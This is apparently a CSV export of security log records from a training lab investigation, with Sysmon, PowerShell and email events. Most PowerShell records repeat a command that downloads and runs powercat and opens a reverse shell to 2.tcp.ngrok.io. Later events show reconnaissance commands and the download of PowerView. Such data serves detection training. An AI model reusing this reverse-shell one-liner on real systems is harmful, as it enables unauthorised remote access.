"_id","_ignored","_index","_score",attachment,content,datasource,direction,"dns.answers.data","dns.question.name","dns.resolved_ip","event.action","event.code","file.path","host.name",message,"network.protocol","powershell.command.invocation_details.value","powershell.command.name","powershell.file.script_block_text","process.command_line","process.name","process.parent.name","process.parent.pid","process.pid","process.working_directory",recipient,"registry.key","registry.path","registry.value",sender,subject,timestamp,"winlog.process.pid"
"-3V3ypsB8mE-0EyZUH5P","-",logs,"-",None," We have exciting new materials and innovative designs that we would love to showcase Let us know if you would like samples or a walkthrough",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","cain.omoore@tryhatme.com","-","-","-","skinner@fashionhatchronicle.com","Vendor Showcase: Latest Hat Materials and Designs","Jan 17, 2026 @ 02:39:30.304","-"
"_HV3ypsB8mE-0EyZVH4e","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Temp\5\__PSScriptPolicyTest_b1baaotg.vsb.ps1","win-3450","-","-","-","-","-","-","powershell.exe","-","-",3728,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:25.304","-"
"_nV3ypsB8mE-0EyZWH4I","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","-","win-3450","Creating Scriptblock text (1 of 1):powershell -ExecutionPolicy BypassScriptBlock ID: 97841cd9-618d-4351-8ee2-73e578719b23Path: ","-","-","-","powershell -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:24.304","9,060"
"_3V3ypsB8mE-0EyZa36n","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\Downloads\PowerView.ps1","win-3450","-","-","-","-","-","-","powershell.exe","-","-",9060,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:11.304","-"
"9XV2ypsB8mE-0EyZ134h","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3457","-","-","-","-","-","""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"" ","OUTLOOK.EXE","explorer.exe",3888,3572,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:00.304","-"
"8nV2ypsB8mE-0EyZrH4-","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\net.exe"" localgroup","net.exe","powershell.exe",9060,892,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:45.304","-"
"-XV3ypsB8mE-0EyZLX4r","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","C:\Windows\system32\net1 localgroup","net1.exe","net.exe",892,6576,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:45.304","-"
"83V2ypsB8mE-0EyZt37e","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\net.exe"" user","net.exe","powershell.exe",9060,7336,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:38.304","-"
"-HV2ypsB8mE-0EyZ8n6V","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","C:\Windows\system32\net1 user","net1.exe","net.exe",7336,7796,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:38.304","-"
"9nV2ypsB8mE-0EyZ1343","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\whoami.exe"" /priv","whoami.exe","powershell.exe",9060,4016,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:32.304","-"
"9HV2ypsB8mE-0EyZu36-","-",logs,"-",None," Attached are some design mockups and pricing options Let us know if you have any adjustments or additional requests",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","liam.espinoza@tryhatme.com","-","-","-","boone@theheadwearhub.com","RE: Inquiry: Custom Hat Order for Corporate Gifting","Jan 17, 2026 @ 02:38:30.304","-"
"8HV2ypsB8mE-0EyZoH5h","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\whoami.exe""","whoami.exe","powershell.exe",9060,8168,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:24.304","-"
"93V2ypsB8mE-0EyZ1345","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\systeminfo.exe""","systeminfo.exe","powershell.exe",9060,3524,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:16.304","-"
"2XV2ypsB8mE-0EyZCH46","-",logs,"-",None," Let’s make sure we address last week’s concerns.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","kyra.flores@tryhatme.com","-","-","-","kyra.flores@tryhatme.com","RE: RE: New Hat Designs - Team Meeting Tomorrow","Jan 17, 2026 @ 02:38:12.304","-"
"13V1ypsB8mE-0EyZ_H7T","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3455","-","-","-","-","-","C:\Windows\System32\mousocoreworker.exe -Embedding","MoUsoCoreWorker.exe","-",3604,3747,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:07.304","-"
"1nV1ypsB8mE-0EyZ_H5a","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""StreamDestinationBuffer""] = (New-Object System.Byte[] $FuncVars[""BufferSize""]). Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=33	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""StreamDestinationBuffer""] = (New-Object System.Byte[] $FuncVars[""BufferSize""]) Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Byte[]""ParameterBinding(New-Object): name=""ArgumentList""; value=""131072""","-","""New-Object"", ""System.Byte[]"", ""131072""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"1XV1ypsB8mE-0EyZ-H57","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""StdErrDestinationBuffer""] = New-Object System.Byte[] 65536. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=47	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""StdErrDestinationBuffer""] = New-Object System.Byte[] 65536 Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Byte[]""ParameterBinding(New-Object): name=""ArgumentList""; value=""65536""","-","""New-Object"", ""System.Byte[]"", ""65536""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"2nV2ypsB8mE-0EyZC37_","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""StdOutDestinationBuffer""] = New-Object System.Byte[] 65536. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=45	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""StdOutDestinationBuffer""] = New-Object System.Byte[] 65536 Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Byte[]""ParameterBinding(New-Object): name=""ArgumentList""; value=""65536""","-","""New-Object"", ""System.Byte[]"", ""65536""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"1HV1ypsB8mE-0EyZ7H7j","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       $Socket = New-Object System.Net.Sockets.TcpClient. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=27	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      $Socket = New-Object System.Net.Sockets.TcpClient Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Net.Sockets.TcpClient""","-","""New-Object"", ""System.Net.Sockets.TcpClient""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"2HV2ypsB8mE-0EyZBH5M","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       Write-Verbose ""Setting up Stream 1..."". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=25	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      Write-Verbose ""Setting up Stream 1..."" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Setting up Stream 1...""","-","""Write-Verbose"", ""Setting up Stream 1...""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"7XV2ypsB8mE-0EyZiX4A","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       $Encoding = New-Object System.Text.AsciiEncoding. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=23	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      $Encoding = New-Object System.Text.AsciiEncoding Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Text.AsciiEncoding""","-","""New-Object"", ""System.Text.AsciiEncoding""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"6XV2ypsB8mE-0EyZeX55","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     Write-Verbose ""Set Stream 2: Process"". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=21	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    Write-Verbose ""Set Stream 2: Process"" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Set Stream 2: Process""","-","""Write-Verbose"", ""Set Stream 2: Process""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"73V2ypsB8mE-0EyZnH67","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       Write-Verbose ""Both Communication Streams Established. Redirecting Data Between Streams..."". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=51	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      Write-Verbose ""Both Communication Streams Established. Redirecting Data Between Streams..."" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Both Communication Streams Established. Redirecting Data Between Streams...""","-","""Write-Verbose"", ""Both Communication Streams Established. Redirecting Data Between Streams...""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"63V2ypsB8mE-0EyZhX4T","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       Write-Verbose ""Setting up Stream 2..."". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=37	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      Write-Verbose ""Setting up Stream 2..."" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Setting up Stream 2...""","-","""Write-Verbose"", ""Setting up Stream 2...""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"7nV2ypsB8mE-0EyZmH6f","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     Write-Verbose ""Set Stream 1: TCP"". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=19	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    Write-Verbose ""Set Stream 1: TCP"" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Set Stream 1: TCP""","-","""Write-Verbose"", ""Set Stream 1: TCP""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"53V2ypsB8mE-0EyZbX6h","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       Write-Verbose ""Connecting..."". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=29	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      Write-Verbose ""Connecting..."" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Connecting...""","-","""Write-Verbose"", ""Connecting...""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"8XV2ypsB8mE-0EyZpH5M","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Temp\5\__PSScriptPolicyTest_saoz2amx.mg5.ps1","win-3450","-","-","-","-","-","-","powershell.exe","-","-",6492,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"43V2ypsB8mE-0EyZSn58","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     Write-Verbose (""Starting Process "" + $FuncSetupVars[0] + ""...""). Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=41	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    Write-Verbose (""Starting Process "" + $FuncSetupVars[0] + ""..."") Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Starting Process powershell...""","-","""Write-Verbose"", ""Starting Process powershell...""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"3HV2ypsB8mE-0EyZG36V","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=39	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Diagnostics.ProcessStartInfo""","-","""New-Object"", ""System.Diagnostics.ProcessStartInfo""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"4HV2ypsB8mE-0EyZJ36N","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell. Context Information: 	DetailSequence=1	DetailTotal=2	SequenceNumber=17	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""","-","""Invoke-Expression""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"33V2ypsB8mE-0EyZI364","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:             Write-Verbose (""Connection to "" + $c + "":"" + $p + "" [tcp] succeeded!""). Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=31	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=            Write-Verbose (""Connection to "" + $c + "":"" + $p + "" [tcp] succeeded!"") Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Connection to 2.tcp.ngrok.io:19282 [tcp] succeeded!""","-","""Write-Verbose"", ""Connection to 2.tcp.ngrok.io:19282 [tcp] succeeded!""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
